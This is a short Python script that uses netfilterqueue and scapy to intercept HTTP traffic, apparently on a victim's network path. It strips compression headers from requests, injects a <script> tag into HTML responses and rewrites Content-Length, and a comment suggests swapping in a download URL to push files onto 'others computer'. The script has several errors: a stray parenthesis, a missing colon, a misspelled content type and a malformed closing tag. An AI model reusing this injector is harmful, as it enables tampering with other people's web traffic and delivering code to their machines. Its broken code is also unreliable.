#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load # Change this http//www.example.org/index.asp to any other downloading URL you want to download in others computer
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load)
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request ")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "",  load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            #print(scapy_packet.show())
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body" , injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/htnl" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))






        if load != scapy_packet[scapy.Raw].load
        new_packet = set_load(scapy_packet, load)
        packet.set_payload(str(new_packet))


    packet.accept() #The packet is trapped using this
    #packet.accept() #packet is forward to the destination

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)# 0 is queue no used in above command
queue.run()


#ping -c bing.com